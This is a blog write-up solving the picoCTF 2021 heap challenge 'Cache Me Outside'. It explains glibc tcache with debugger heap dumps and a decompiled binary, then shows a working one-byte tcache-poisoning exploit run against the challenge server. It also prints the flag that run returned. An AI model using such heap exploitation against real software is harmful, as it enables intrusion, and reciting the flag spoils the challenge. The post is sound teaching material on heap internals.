---
layout: post
title: Learning tcache - picoCTF 2021 Cache Me Outside
tags: [CTF, reverse]
---
> While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations. `nc mercury.picoctf.net 36605`

Attached are the executable [`heapedit`](https://mercury.picoctf.net/static/482492895851479e0da770f2892e2677/heapedit), its [Makefile](https://mercury.picoctf.net/static/482492895851479e0da770f2892e2677/Makefile), and [libc.so.6](https://mercury.picoctf.net/static/482492895851479e0da770f2892e2677/libc.so.6)

## Overview
First let's take a look at the Makefile
```
all:
	gcc -Xlinker -rpath=./ -Wall -m64 -pedantic -no-pie --std=gnu99 -o heapedit heapedit.c

clean:
	rm heapedit
```
Nothing very special besides `-no-pie`

`checksec` shows
```
[*] '/home/nick/coding/ctf/pwn/Cache Me Outside/heapedit'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```
Let's run it. Use `pwninit` to get the correct linker and execute the binary
```
❯ LD_PRELOAD=./libc.so.6 ./ld-2.27.so ./heapedit
You may edit one byte in the program.
Address: 0
Value: 0
t help you: this is a random string.
```
We don't know what the two values mean, so let's decompile it

## Decompilation
After feeding the binary to Ghidra, this is the output:
```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined local_a9;
  int local_a8;
  int local_a4;
  undefined8 *local_a0;
  undefined8 *local_98;
  FILE *local_90;
  undefined8 *local_88;
  void *local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined local_60;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  local_90 = fopen("flag.txt","r");
  fgets(local_58,0x40,local_90);
  local_78 = 0x2073692073696874;
  local_70 = 0x6d6f646e61722061;
  local_68 = 0x2e676e6972747320;
  local_60 = 0;
  local_a0 = (undefined8 *)0x0;
  for (local_a4 = 0; local_a4 < 7; local_a4 = local_a4 + 1) {
    local_98 = (undefined8 *)malloc(0x80);
    if (local_a0 == (undefined8 *)0x0) {
      local_a0 = local_98;
    }
    *local_98 = 0x73746172676e6f43;
    local_98[1] = 0x662072756f592021;
    local_98[2] = 0x203a73692067616c;
    *(undefined *)(local_98 + 3) = 0;
    strcat((char *)local_98,local_58);
  }
  local_88 = (undefined8 *)malloc(0x80);
  *local_88 = 0x5420217972726f53;
  local_88[1] = 0x276e6f7720736968;
  local_88[2] = 0x7920706c65682074;
  *(undefined4 *)(local_88 + 3) = 0x203a756f;
  *(undefined *)((long)local_88 + 0x1c) = 0;
  strcat((char *)local_88,(char *)&local_78);
  free(local_98);
  free(local_88);
  local_a8 = 0;
  local_a9 = 0;
  puts("You may edit one byte in the program.");
  printf("Address: ");
  __isoc99_scanf(&DAT_00400b48,&local_a8);
  printf("Value: ");
  __isoc99_scanf(&DAT_00400b53,&local_a9);
  *(undefined *)((long)local_a8 + (long)local_a0) = local_a9;
  local_80 = malloc(0x80);
  puts((char *)((long)local_80 + 0x10));
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
This binary
1. Reads the flag file into a buffer (`local_58`)
2. `malloc` 7 buffers with "Congrats! Your flag is: " and the flag concatenates behind. The address to the first and the last buffer are stored in `local_a0` and `local_98` respectively.
3. `malloc` another buffer with "Sorry! This won't help you: this is a random string.".
4. `free` the last buffer with the flag (`local_98`) and one without the flag (`local_88`)
5. Asks the user to modify a byte (`local_a9`) at an offset (`local_a8`) from the first buffer (`local_a0`)
6. `malloc` a buffer and prints whatever is has at offset `0x10`

So for the result of first try, part of the `free`d `local_88` was printed, why? Remember that this is not a use-after-free case. It is because how **tcache** works.

## tcache
From libc 2.26, the heap management is further optimized by the *tcache* mechanism. It is an optimization for per-thread cache.

Each thread in a given process has its own registers and stack for local variables, but things like global variables and **the heap** are shared between threads. To prevent race conditions, a lock is often used. But locks are expensive, while the overhead may be acceptable for global variables, for things being constantly in use like heap, the cost of locking for heap operations will eventually slow down the application.

The heap manager solves this problem by using per-thread arena for each thread to use. Like normal heap management, there are bins of small chunks of memory ready for allocation per thread. Eventually, a thread could allocate a chunk without waiting for the heap lock if there is anything available on its own tcache.

tcache stores recently freed chunks (max 7 per idx by default). The tcache bin consists of a linked list, where one chunk points to the next chunk.

Let's see it in action. Put a breakpoint before the first free of `heapedit`
```
gef➤  heap chunks
Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE)
    [0x0000000000602010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE)
    [0x0000000000602260     88 24 ad fb 00 00 00 00 a3 24 60 00 00 00 00 00    .$.......$`.....]
Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE)
    [0x0000000000602490     70 69 63 6f 43 54 46 7b 74 65 73 74 5f 66 6c 61    picoCTF{test_fla]
Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE)
    [0x00000000006034a0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
    [0x0000000000603800     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)
    [0x0000000000603890     53 6f 72 72 79 21 20 54 68 69 73 20 77 6f 6e 27    Sorry! This won']
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE)
    [0x0000000000603920     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]

gef➤  heap bins tcache 
────────────────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────────────────
All tcachebins are empty
```
All of the allocated buffers are not yet in tcache

Now continue until the two buffers are `free`d
```
gef➤  heap chunks
Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE)
    [0x0000000000602010     00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE)
    [0x0000000000602260     88 24 ad fb 00 00 00 00 a3 24 60 00 00 00 00 00    .$.......$`.....]
Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE)
    [0x0000000000602490     70 69 63 6f 43 54 46 7b 74 65 73 74 5f 66 6c 61    picoCTF{test_fla]
Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE)
    [0x00000000006034a0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
    [0x0000000000603800     00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66    ........! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)
    [0x0000000000603890     00 38 60 00 00 00 00 00 68 69 73 20 77 6f 6e 27    .8`.....his won']
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE)
    [0x0000000000603920     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE)  ←  top chunk
gef➤  heap bins tcache 
────────────────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────────────────
Tcachebins[idx=7, size=0x90] count=2  ←  Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
```
The `free`d chunks are now both in tcache bins. The first chunk in the linked list is the "This won't help you" one, as expected.

Now we break after the last `malloc`
```
gef➤  heap chunks
Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE)
    [0x0000000000602010     00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE)
    [0x0000000000602260     88 24 ad fb 00 00 00 00 a3 24 60 00 00 00 00 00    .$.......$`.....]
Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE)
    [0x0000000000602490     70 69 63 6f 43 54 46 7b 74 65 73 74 5f 66 6c 61    picoCTF{test_fla]
Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE)
    [0x00000000006034a0     30 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    0ongrats! Your f]
Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
    [0x0000000000603800     00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66    ........! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)
    [0x0000000000603890     00 38 60 00 00 00 00 00 68 69 73 20 77 6f 6e 27    .8`.....his won']
Chunk(addr=0x603920, size=0x410, flags=PREV_INUSE)
    [0x0000000000603920     30 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 00    0...............]
Chunk(addr=0x603d30, size=0x1f2e0, flags=PREV_INUSE)
    [0x0000000000603d30     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x603d30, size=0x1f2e0, flags=PREV_INUSE)  ←  top chunk
gef➤  heap bins tcache 
────────────────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────────────────
Tcachebins[idx=7, size=0x90] count=1  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
```
Only the buffer with the flag remains in tcache as the one without the flag is `malloc`'d.

## Attack
Back to the attack. At the final `malloc`, the last chunk of the last `free`d would be used as the tcache implementation, which is why we're getting part of `local_88`. We need the heap manager to give us another chunk of memory - the one with the flag. So if we can make the linked list of tcache points to the flag buffer, it will be used during the next `malloc`, and the content will be printed.

Since we can sort of write anything to any address, first find where to write, which should be the one pointing to the chunk without the flag. Break after the two `free`s and check the tcache.

*NOTE: this is another run of the binary*
```
gef➤  heap chunks
Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE)
    [0x0000000000602010     00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE)
    [0x0000000000602260     88 24 ad fb 00 00 00 00 a3 24 60 00 00 00 00 00    .$.......$`.....]
Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE)
    [0x0000000000602490     70 69 63 6f 43 54 46 7b 74 65 73 74 5f 66 6c 61    picoCTF{test_fla]
Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE)
    [0x00000000006034a0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
    [0x0000000000603800     00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66    ........! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)
    [0x0000000000603890     00 38 60 00 00 00 00 00 68 69 73 20 77 6f 6e 27    .8`.....his won']
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE)
    [0x0000000000603920     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE)  ←  top chunk
gef➤  heap bins tcache
────────────────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────────────────
Tcachebins[idx=7, size=0x90] count=2  ←  Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE)
```
Find `0x603890` in the memory
```
gef➤  search-patter 0x603890
[+] Searching '\x90\x38\x60' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602088 - 0x602094  →   "\x90\x38\x60[...]" 
[+] In '[stack]'(0x7ffffffdd000-0x7ffffffff000), permission=rw-
  0x7fffffffd530 - 0x7fffffffd53c  →   "\x90\x38\x60[...]" 
  0x7fffffffd920 - 0x7fffffffd92c  →   "\x90\x38\x60[...]"
```
We need the one on the heap, `0x602088`. The offset from `local_a0` (the first of seven consecutive `malloc`s, which is `0x6034a0`) is `-5144`. So the "Address:" part will be this number.

The value to be changed to is `0x603800`. We can only change one byte, but remember we're running on little-endian, `0x90` is what will be changed. The "Value:" part should be `0x00`

Finally let's try the exploit.
```
❯ { echo "-5144"; printf "\x00";} | LD_PRELOAD=./libc.so.6 ./ld-2.27.so ./heapedit
You may edit one byte in the program.
Address: Value: lag is: picoCTF{test_flag}
```
It works! How about remote?
```
❯ { echo "-5144"; printf "\x00";} | nc mercury.picoctf.net 36605
You may edit one byte in the program.
Address: Value: lag is: picoCTF{702d6d8ea75c4c92fe509690a593fee2}
```

## Reference
- [CTFs/Cache_Me_Outside.md at master · Dvd848/CTFs](https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Cache_Me_Outside.md)
- [Heap Exploitation Part 2: Understanding the Glibc Heap Implementation \| Azeria Labs](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)
